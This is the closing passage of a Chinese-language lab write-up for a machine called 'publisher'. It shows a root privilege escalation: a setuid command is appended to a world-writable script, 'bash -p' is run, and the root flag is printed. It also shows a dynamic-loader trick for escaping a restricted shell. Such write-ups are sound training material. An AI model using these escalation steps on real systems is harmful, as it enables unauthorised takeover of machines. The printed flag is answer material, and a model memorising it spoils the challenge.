(remote) think@publisher:/tmp$ echo 'chmod +s /bin/bash' >> /opt/run_container.sh
(remote) think@publisher:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
(remote) think@publisher:/tmp$ /usr/sbin/run_container
(remote) think@publisher:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
(remote) think@publisher:/tmp$ bash -p
(remote) root@publisher:/tmp# cd ~
(remote) root@publisher:/home/think# ls -la
total 48
drwxr-xr-x 8 think    think    4096 Feb 10 21:27 .
drwxr-xr-x 3 root     root     4096 Nov 13  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Jul 10 07:50 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10 12:46 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .python_history -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
drwxr-xr-x 2 think    think    4096 Jan 10 12:54 .ssh
-rw-r--r-- 1 root     root       35 Feb 10 21:20 user.txt
lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .viminfo -> /dev/null
(remote) root@publisher:/home/think# whoami;id
root
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
(remote) root@publisher:/home/think# cd /root
(remote) root@publisher:/root# ls -la
total 56
drwx------  7 root  root   4096 Mar 29 13:25 .
drwxr-xr-x 18 root  root   4096 Nov 14  2023 ..
lrwxrwxrwx  1 root  root      9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root  root   3246 Jun 21  2023 .bashrc
drwx------  2 root  root   4096 Nov 11  2023 .cache
drwx------  3 root  root   4096 Dec  8  2023 .config
drwxr-xr-x  3 root  root   4096 Jun 21  2023 .local
lrwxrwxrwx  1 root  root      9 Nov 11  2023 .mysql_history -> /dev/null
-rw-r--r--  1 root  root    161 Dec  5  2019 .profile
-rw-r-----  1 root  root     35 Feb 10 21:20 root.txt
-rw-r--r--  1 root  root     75 Nov 13  2023 .selected_editor
drwxr-x---  5 think think  4096 Dec  7  2023 spip
drwx------  2 root  root   4096 Dec 20  2023 .ssh
-rw-rw-rw-  1 root  root  11913 Mar 29 13:25 .viminfo
(remote) root@publisher:/root# cat root.txt 
3a4225cc9e85709adda6ef55d6a4f2ca
```

## 额外收获

这里看到作者采用的是使用动态链接库生成一个bash的shell，很方遍！！！

```bash
/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash
```

这里因地制宜采用不同名的文件进行修改：

```bash
think@publisher:/tmp$ ls /lib/x86_64-linux-gnu/ | grep 'x86-64'
ld-linux-x86-64.so.2
libpyldb-util.cpython-38-x86-64-linux-gnu.so.2
libpyldb-util.cpython-38-x86-64-linux-gnu.so.2.4.4
libpytalloc-util.cpython-38-x86-64-linux-gnu.so.2
libpytalloc-util.cpython-38-x86-64-linux-gnu.so.2.3.3
libsamba-policy.cpython-38-x86-64-linux-gnu.so.0
libsamba-policy.cpython-38-x86-64-linux-gnu.so.0.0.1
think@publisher:/tmp$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
think@publisher:/tmp$ echo $SHELL
/usr/sbin/ash
think@publisher:/tmp$ cd /opt
think@publisher:/opt$ ls -la
total 20
drwxr-xr-x  3 root root 4096 Mar 29 13:25 .
drwxr-xr-x 18 root root 4096 Nov 14  2023 ..
drwx--x--x  4 root root 4096 Nov 14  2023 containerd
-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx  1 root root   31 Jul 10 09:19 run_container.sh
```

也达到了和之前一样的效果！！！牛逼！！！

## 参考

https://github.com/Brntpcnr/WriteupsHMV/blob/main/Publisher.txt

https://blog.findtodd.com/2024/06/19/hmv-Publisher/

https://medium.com/@josemlwdf/publisher-cccb172abd8e